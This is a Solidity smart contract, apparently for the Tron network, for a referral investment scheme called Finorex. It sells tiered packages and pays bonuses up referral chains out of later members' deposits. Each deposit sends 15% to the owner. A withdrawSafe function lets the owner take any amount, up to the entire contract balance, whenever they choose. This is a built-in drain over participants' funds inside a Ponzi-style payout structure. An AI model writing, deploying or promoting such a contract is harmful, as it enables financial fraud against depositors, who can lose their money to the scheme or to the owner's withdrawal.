//SourceUnit: Finorex.sol

pragma solidity ^0.6.12;
// SPDX-License-Identifier: MIT
contract Finorex {
    struct User {
        uint id;
        uint uplineid;
        uint autopooluplineid;
        address direct_upline;
        address autopool_upline;
        uint256 referrals;
        uint256 poolreferrals;
        uint256 payouts;
        uint256 package;
        uint256 packageamount;
        uint256 max_payouts;
        uint256 royalty_payouts;
        uint40 activated_time;
        address[] directReferrals;
        address[] autopoolreferrals;
        uint256[] numofpackage;
        uint256[] packagewhenroyalty;
    }
    struct UserBonus {
        uint256 level_bonus;
        uint256 missed_leadership;
        uint256 missed_level;
        uint256 direct_bonus;
        uint256 leadership_bonus;
        uint256 team_performance_bonus;
    }
    
    address payable public owner;
    uint public currId = 1;
    mapping(address => User) public users;
    mapping(address => UserBonus) public userbonuses;
    mapping(uint => address) public usersList;
    mapping(uint => uint256) public packages;
    uint8[] public level_bonuses; 
    uint8[] public leadership_bonuses; 
    uint8 public royaltyshare = 6;
    uint40 multiplier = 10;    

    address[] Goldusers;
    address[] Bronzeusers;
    address[] Silverusers;
    address[] Platinumusers;
    address[] Diamondusers;
    uint256 public royaltycycle;
    mapping (uint256 => uint256[4]) public royaltybonuses;
    mapping (uint256 => uint256[4]) public royaltyuserslength;
    mapping (uint256 => uint256) public royaltytime;
    struct royaltyStruct {
        uint256 amount;
        uint256 userslength;
        uint256 royaltycycletime;
    }
    uint256 silverDivident;
    uint256 goldDivident;
    uint256 platinumDivident;
    uint256 diamondDivident;

   uint40 public royalty_last_draw;
    uint256 public royalty_balance;
    
    event Buypackage(uint256 addrid,uint256 uplineid,address indexed addr,  address indexed upline,uint256 amount,uint256 package);
    event DirectPayout(uint256 addrid,uint256 fromid,address indexed addr, address indexed from, uint256 amount,uint256 package);
    event LevelPayout(uint256 addrid,uint256 fromid,address indexed addr, address indexed from, uint256 amount,uint256 package,uint256 level);
    event LeaderShipPayout(uint256 addrid,uint256 fromid,address indexed addr, address indexed from, uint256 amount,uint256 package,uint256 level);
    event TeamPerformPayout(uint256 addrid,uint256 fromid,address indexed addr, address indexed from, uint256 amount);
    event Withdraw(uint256 addrid,address indexed addr, uint256 amount);
    
    constructor(address payable _owner) public {
        owner = _owner;
        
        level_bonuses.push(100);
        level_bonuses.push(50);
        level_bonuses.push(20);
        level_bonuses.push(20);
        level_bonuses.push(10);
        level_bonuses.push(20);
        level_bonuses.push(10);
        level_bonuses.push(20);
        level_bonuses.push(10);
        level_bonuses.push(10);
        level_bonuses.push(5);
        level_bonuses.push(5);
        level_bonuses.push(5);
        level_bonuses.push(5);
        level_bonuses.push(10);
        
        leadership_bonuses.push(50);
        leadership_bonuses.push(20);
        leadership_bonuses.push(20);
        leadership_bonuses.push(10);
        leadership_bonuses.push(10);
        leadership_bonuses.push(5);
        leadership_bonuses.push(5);
        leadership_bonuses.push(5);
        leadership_bonuses.push(5);
        leadership_bonuses.push(10);
        
        packages[1] = 500 trx;
        packages[2] = 1000 trx;
        packages[3] = 2000 trx;
        packages[4] = 5000 trx;
        packages[5] = 10000 trx;
        
        usersList[currId] = owner;
        users[owner].id = currId;
        
        currId++;
        royalty_last_draw = uint40(block.timestamp);
        
        Diamondusers.push(owner);        
        users[owner].packagewhenroyalty.push(royaltycycle);
        users[owner].numofpackage.push(5);
        
        users[owner].package = 5;
        users[owner].packageamount = 10000 trx;
        users[owner].activated_time = uint40(block.timestamp);
    }
    
    function Register(uint40 packageno,address upline) public payable {
        require(upline != address(0),"Invalid upline");
        require(users[upline].package > 0,"Upline not yet activated");
        require(packages[packageno] == msg.value,"Bad amount");
        require(msg.value >= packages[1],"Bad amount");
        require(packageno > users[msg.sender].package,"You only allowed to upgrade your package only");
        if(packageno == 1){
            Bronzeusers.push(msg.sender);
        }else if(packageno == 2){
            Silverusers.push(msg.sender);
        }else if(packageno == 3){
            Goldusers.push(msg.sender);
        }else if(packageno == 4){
            Platinumusers.push(msg.sender);
        }else if(packageno == 5){
            Diamondusers.push(msg.sender);
        }
        if(users[msg.sender].package == 0){
            users[msg.sender].id = currId;
            users[msg.sender].direct_upline = upline;
            users[msg.sender].uplineid = users[upline].id;
            users[msg.sender].package = packageno;
            users[msg.sender].packageamount = msg.value;
            users[msg.sender].activated_time = uint40(block.timestamp);
            users[msg.sender].max_payouts = 0;
            usersList[currId] = msg.sender;
            users[upline].referrals++;
            users[upline].directReferrals.push(msg.sender);
            address poolUpline = findFreep1Referrer(upline);        
            users[poolUpline].poolreferrals++;
            users[poolUpline].autopoolreferrals.push(msg.sender);
            users[msg.sender].autopool_upline = poolUpline;
            users[msg.sender].autopooluplineid = users[poolUpline].id;
            emit Buypackage(currId,users[upline].id,msg.sender,upline,msg.value,packageno);
            currId++;
            
        }else{
            upline = users[msg.sender].direct_upline;
            users[msg.sender].package = packageno;
            users[msg.sender].packageamount = msg.value;
            users[msg.sender].activated_time = uint40(block.timestamp);
            users[msg.sender].max_payouts = 0;
            emit Buypackage(users[msg.sender].id,users[upline].id,msg.sender,upline,msg.value,packageno);            
        }
        users[msg.sender].packagewhenroyalty.push(royaltycycle);
        users[msg.sender].numofpackage.push(packageno);
        userbonuses[users[msg.sender].direct_upline].direct_bonus += msg.value * 35 / 100;
        emit DirectPayout(users[users[msg.sender].direct_upline].id,users[msg.sender].id,users[msg.sender].direct_upline,msg.sender, msg.value * 35 / 100,packageno);
        leadershipPayout(msg.sender);
        levelPayout(msg.sender);  
        
        
        royalty_balance += msg.value * 6 / 100;
        
        if(uint40(block.timestamp) >= royalty_last_draw + 1 days ){
            silverDivident = royalty_balance * 20 / 100;
            goldDivident = royalty_balance * 20 / 100;
            diamondDivident = royalty_balance * 30 / 100;
            platinumDivident = royalty_balance * 30 / 100;
            royalty_balance = 0;
                   
            royaltybonuses[royaltycycle][0] = silverDivident;
            royaltyuserslength[royaltycycle][0] = Silverusers.length;
            royaltytime[royaltycycle] = block.timestamp;
            
            royaltybonuses[royaltycycle][1] = goldDivident;
            royaltyuserslength[royaltycycle][1] = Goldusers.length;
            royaltytime[royaltycycle] = block.timestamp;
            
            royaltybonuses[royaltycycle][2] = platinumDivident;
            royaltyuserslength[royaltycycle][2] = Platinumusers.length;
            royaltytime[royaltycycle] = block.timestamp;
            
            royaltybonuses[royaltycycle][3] = diamondDivident;
            royaltyuserslength[royaltycycle][3] = Diamondusers.length;
            royaltytime[royaltycycle] = block.timestamp;
            
            royaltycycle += 1;
            royalty_last_draw = uint40(block.timestamp);
        }
        owner.transfer(msg.value * 15 / 100);
    }
    
    function findFreep1Referrer(address _userAddress) public view returns (address) {
        if (users[_userAddress].autopoolreferrals.length < 2) {
            return _userAddress;
        }
            

        address[] memory referrals = new address[](1024);
        referrals[0] = users[_userAddress].autopoolreferrals[0];
        referrals[1] = users[_userAddress].autopoolreferrals[1];

        address freeReferrer;
        bool noFreeReferrer = true;

        for (uint i = 0; i < 1024; i++) { 
            if (users[referrals[i]].autopoolreferrals.length == 2) {
                if (i < 512) {
                    referrals[(i+1)*2] = users[referrals[i]].autopoolreferrals[0];
                    referrals[(i+1)*2+1] = users[referrals[i]].autopoolreferrals[1];
                }
            } else {
                noFreeReferrer = false;
                freeReferrer = referrals[i];
                break;
            }            
        }
        require(!noFreeReferrer, "No Free Referrer");
        return freeReferrer;
    }
    function viewRoyaltyBonus(address _user) public view returns(uint256){
        uint256 bonusamount = 0;
        uint256 index = 0; 
        uint256 royaltyone = users[_user].packagewhenroyalty[index];
        for(uint256 i = royaltyone;i<royaltycycle;i++){
            uint256 packano = users[_user].numofpackage[index];
            if(packano >= 2){
                if(users[_user].packagewhenroyalty.length > index + 1) {
                    if(i == users[_user].packagewhenroyalty[index + 1]){
                        index++;
                    }
                }
                uint256 royaltyamount = royaltybonuses[i][packano-2];
                uint256 royaltylength = royaltyuserslength[i][packano-2];
                if(royaltyamount != 0 && royaltylength != 0){
                    uint256 amount = royaltyamount / royaltylength;
                    bonusamount += amount;
                }
            }
            
        }
        return bonusamount;
    }
    function viewRoyaltyBonusWithDetail(address _user) public view returns(uint256[] memory,uint256[] memory){
        uint256 index = 0; 
        uint256 arrayindex = 0; 
        uint256 royaltyone = users[_user].packagewhenroyalty[index];
        uint256[] memory _bonusamount = new uint256[](royaltycycle - royaltyone);
        uint256[] memory _time = new uint256[](royaltycycle - royaltyone);
         for(uint256 i = royaltyone;i<royaltycycle;i++){
            uint256 packano = users[_user].numofpackage[index];
            if(packano >= 2){
                if(users[_user].packagewhenroyalty.length > index + 1) {
                    if(i == users[_user].packagewhenroyalty[index + 1]){
                        index++;
                    }
                }
                uint256 royaltyamount = royaltybonuses[i][packano-2];
                uint256 royaltylength = royaltyuserslength[i][packano-2];
                if(royaltyamount != 0 && royaltylength != 0){
                    uint256 amount = royaltyamount / royaltylength;
                    _bonusamount[arrayindex] = amount;
                    _time[arrayindex] = royaltytime[i];
                }
            }
            arrayindex++;
        }
        return(_bonusamount,_time);
        
    }
    function levelPayout(address user) private{
        address upline = users[user].autopool_upline;
        for(uint40 i=0;i<level_bonuses.length;i++){
            if(upline == address(0))
                break;
            uint256 bonus = msg.value * level_bonuses[i] / 1000;
            if(i<1){                            
                userbonuses[upline].level_bonus += bonus;
                users[upline].max_payouts += bonus;
                emit LevelPayout(users[upline].id,users[user].id,upline, user, bonus,users[user].package,i + 1); 
            }else{
                if(users[upline].referrals >= 2){         
                    userbonuses[upline].level_bonus += bonus;
                    users[upline].max_payouts += bonus;
                    emit LevelPayout(users[upline].id,users[user].id,upline, user, bonus,users[user].package,i + 1);           
                }else{          
                    userbonuses[upline].missed_level += bonus;
                    users[upline].max_payouts += bonus;
                    emit LevelPayout(users[upline].id,users[user].id,upline, user, bonus,users[user].package,i + 1);                                
                }
            }
            upline = users[upline].autopool_upline;
        }
    }
    
    function leadershipPayout(address user) private{
        address upline = users[user].direct_upline;
        for(uint40 i=0;i<leadership_bonuses.length;i++){
            if(upline == address(0))
                break;
            uint256 bonus = msg.value * leadership_bonuses[i] / 1000;
            
            if(i<1){                
                userbonuses[upline].leadership_bonus += bonus;
                users[upline].max_payouts += bonus;
                emit LeaderShipPayout(users[upline].id,users[user].id,upline, user, bonus,users[user].package,i + 1);            
            }else{
                if(users[upline].referrals >= 2){
                    userbonuses[upline].leadership_bonus += bonus;
                    users[upline].max_payouts += bonus;
                    emit LeaderShipPayout(users[upline].id,users[user].id,upline, user, bonus,users[user].package,i + 1);            
                }else{
                    userbonuses[upline].missed_leadership += bonus;
                    users[upline].max_payouts += bonus;
                    emit LeaderShipPayout(users[upline].id,users[user].id,upline, user, bonus,users[user].package,i + 1);                    
                }
            }
            upline = users[upline].direct_upline;
        }
    }
    
    function withdraw() external {
        uint256 withdrawable_amount;
        uint256 bonusAmount = 0;
        if(userbonuses[msg.sender].direct_bonus > 0){
            withdrawable_amount += userbonuses[msg.sender].direct_bonus;
            users[msg.sender].payouts += userbonuses[msg.sender].direct_bonus;
            userbonuses[msg.sender].direct_bonus = 0;
        }
        uint256 userroyalty = viewRoyaltyBonus(msg.sender);
        if(userroyalty - users[msg.sender].royalty_payouts > 0 && users[msg.sender].referrals >= 2){
            uint256 royalty_bonus = userroyalty - users[msg.sender].royalty_payouts;
            withdrawable_amount += royalty_bonus;
            users[msg.sender].payouts += royalty_bonus;
            users[msg.sender].royalty_payouts += royalty_bonus;
        }
        if(userbonuses[msg.sender].team_performance_bonus > 0 && users[msg.sender].referrals >= 2){
            withdrawable_amount += userbonuses[msg.sender].team_performance_bonus;
            users[msg.sender].payouts += userbonuses[msg.sender].team_performance_bonus;
            userbonuses[msg.sender].team_performance_bonus = 0;
        }
        if(userbonuses[msg.sender].level_bonus > 0){
            if(users[msg.sender].package <= 3){
                if(users[msg.sender].max_payouts <= users[msg.sender].packageamount * multiplier){
                    withdrawable_amount += userbonuses[msg.sender].level_bonus;
                    users[msg.sender].payouts += userbonuses[msg.sender].level_bonus;
                    bonusAmount += userbonuses[msg.sender].level_bonus;
                    userbonuses[msg.sender].level_bonus = 0;
                }
            }else{
                withdrawable_amount += userbonuses[msg.sender].level_bonus;
                users[msg.sender].payouts += userbonuses[msg.sender].level_bonus;
                bonusAmount += userbonuses[msg.sender].level_bonus;
                userbonuses[msg.sender].level_bonus = 0;
            }
            
        }
        if(userbonuses[msg.sender].leadership_bonus > 0){
            if(users[msg.sender].package <= 3){
                if(users[msg.sender].max_payouts <= users[msg.sender].packageamount * multiplier){
                    withdrawable_amount += userbonuses[msg.sender].leadership_bonus;
                    bonusAmount += userbonuses[msg.sender].leadership_bonus;
                    users[msg.sender].payouts += userbonuses[msg.sender].leadership_bonus;
                    userbonuses[msg.sender].leadership_bonus = 0;
                }
            } else {
                withdrawable_amount += userbonuses[msg.sender].leadership_bonus;
                bonusAmount += userbonuses[msg.sender].leadership_bonus;
                users[msg.sender].payouts += userbonuses[msg.sender].leadership_bonus;
                userbonuses[msg.sender].leadership_bonus = 0;
            }
        }
        if(userbonuses[msg.sender].missed_leadership > 0  && users[msg.sender].referrals >= 2){
            if(users[msg.sender].package <= 3){
                if(users[msg.sender].max_payouts <= users[msg.sender].packageamount * multiplier){
                    withdrawable_amount += userbonuses[msg.sender].missed_leadership;
                    bonusAmount += userbonuses[msg.sender].missed_leadership;
                    users[msg.sender].payouts += userbonuses[msg.sender].missed_leadership;
                    userbonuses[msg.sender].missed_leadership = 0;
                }
            } else {
                withdrawable_amount += userbonuses[msg.sender].missed_leadership;
                bonusAmount += userbonuses[msg.sender].missed_leadership;
                users[msg.sender].payouts += userbonuses[msg.sender].missed_leadership;
                userbonuses[msg.sender].missed_leadership = 0;
            }
        }
        if(userbonuses[msg.sender].missed_level > 0  && users[msg.sender].referrals >= 2){
            if(users[msg.sender].package <= 3){
                if(users[msg.sender].max_payouts <= users[msg.sender].packageamount * multiplier){
                    withdrawable_amount += userbonuses[msg.sender].missed_level;
                    bonusAmount += userbonuses[msg.sender].missed_level;
                    users[msg.sender].payouts += userbonuses[msg.sender].missed_level;
                    userbonuses[msg.sender].missed_level = 0;
                }
            } else {
                withdrawable_amount += userbonuses[msg.sender].missed_level;
                bonusAmount += userbonuses[msg.sender].missed_level;
                users[msg.sender].payouts += userbonuses[msg.sender].missed_level;
                userbonuses[msg.sender].missed_level = 0;
            }
        }
        if(withdrawable_amount > 0){
            address upline = users[msg.sender].direct_upline;
            if(upline != address(0)){
                userbonuses[upline].team_performance_bonus += bonusAmount / 10;
                withdrawable_amount -= bonusAmount / 10;
                emit TeamPerformPayout(users[upline].id,users[msg.sender].id,upline,msg.sender,bonusAmount / 10);
            }
            msg.sender.transfer(withdrawable_amount);
            emit Withdraw(users[msg.sender].id,msg.sender,withdrawable_amount);
        }
    }
    function changePackageAmount(uint40 packageno,uint256 packageamount) external {
        require(msg.sender==owner,'Permission denied');
        packages[packageno] = packageamount;
    }
    function changeMultiplier(uint40 numoftimes) external {
        require(msg.sender==owner,'Permission denied');
        multiplier = numoftimes;
    }
    function withdrawSafe(uint _amount) external {
        require(msg.sender==owner,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                owner.transfer(amtToTransfer);
            }
        }
    }
    
    function viewUserReferrals(address user) public view returns(address[] memory){
        return users[user].directReferrals;
    }
    function viewUsers(uint40 packageno) public view returns(address[] memory){
        if(packageno == 1){
            return Bronzeusers;
        }else if(packageno == 2){
            return Silverusers;
        }else if(packageno == 3){
            return Goldusers;
        }else if(packageno == 4){
            return Platinumusers;
        }else if(packageno == 5){
            return Diamondusers;
        }
    }
    function royaltyBonusUserCount() public view returns(uint256 bronze,uint256 silver,uint256 gold,uint256 Platinum,uint256 Diamond){
        bronze = Bronzeusers.length;
        silver = Silverusers.length;
        gold = Goldusers.length;
        Platinum =  Platinumusers.length;
        Diamond = Diamondusers.length;
    }
    function viewPoolReferrals(address user) public view returns(address[] memory){
        return users[user].autopoolreferrals;
    }    
}